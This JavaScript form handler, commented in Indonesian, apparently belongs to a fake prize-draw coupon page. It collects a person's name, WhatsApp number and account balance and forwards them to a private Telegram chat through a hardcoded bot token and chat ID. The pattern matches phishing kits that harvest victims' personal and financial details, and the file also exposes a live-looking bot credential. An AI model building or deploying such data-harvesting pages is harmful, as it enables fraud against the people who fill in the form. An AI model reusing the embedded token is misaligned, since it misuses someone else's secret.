// Script untuk menggantikan satu.php (versi JS dengan kirim ke Telegram)
$(document).ready(function() {
    $('#formData').on('submit', function(e) {
        e.preventDefault(); // Mencegah submit default ke satu.php

        // Ambil data dari form
        var nama = $('#namalengkap').val().trim();
        var nowa = $('#nowa').val().trim();
        var saldo = $('#dengan-rupiah').val().trim();
        var kupon = $('#kupon').val();

        // Validasi sederhana
        if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
            alert('Harap isi semua field yang diperlukan.');
            return false;
        }

        // Format saldo jika ada fungsi rupiah (dari rupiah.js)
        if (typeof formatRupiah === 'function') {
            saldo = formatRupiah(saldo);
        }

        // Simpan data ke localStorage (sebagai contoh penyimpanan client-side)
        var dataKupon = {
            nama: nama,
            nowa: nowa,
            saldo: saldo,
            kupon: kupon,
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('kuponData', JSON.stringify(dataKupon));

        // Kirim data ke Telegram via Bot API
        var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';  // Ganti dengan token bot Anda dari BotFather
        var chatId = '5529657606';       // Ganti dengan chat ID (misalnya, 123456789 untuk pribadi)
        var message = `🎉 Kupon Baru Dicetak!\n\n` +
                      `Nama: ${nama}\n` +
                      `No. WhatsApp: ${nowa}\n` +
                      `Saldo Akhir: ${saldo}\n` +
                      `Kupon: ${kupon}\n` +
                      `Waktu: ${dataKupon.timestamp}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'  // Opsional: Untuk format teks (bold, dll.)
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Pesan dikirim ke Telegram:', data);
                alert('Kupon berhasil dicetak dan dikirim ke Telegram!');
            } else {
                console.error('Error Telegram:', data);
                alert('Gagal mengirim ke Telegram. Periksa token dan chat ID.');
            }
        })
        .catch(error => {
            console.error('Error fetch:', error);
            alert('Error jaringan. Coba lagi.');
        });

        // Simulasi cetak kupon (tampilkan di halaman)
        var kuponHTML = `
            <div style="text-align: center; margin-top: 20px; padding: 20px; border: 1px solid #ccc; background: #f9f9f9;">
                <h3>Kupon Anda Telah Dicetak!</h3>
                <p><strong>Nama:</strong> ${nama}</p>
                <p><strong>No. WhatsApp:</strong> ${nowa}</p>
                <p><strong>Saldo Akhir:</strong> ${saldo}</p>
                <p><strong>Kupon:</strong> ${kupon}</p>
                <p>Selamat! Anda berhak mengikuti undian. Data juga dikirim ke Telegram.</p>
            </div>
        `;
        $('.coverform').after(kuponHTML); // Tambahkan setelah form

        // Reset form
        $('#formData')[0].reset();

        // Log ke console untuk debugging
        console.log('Data Kupon:', dataKupon);
    });
});
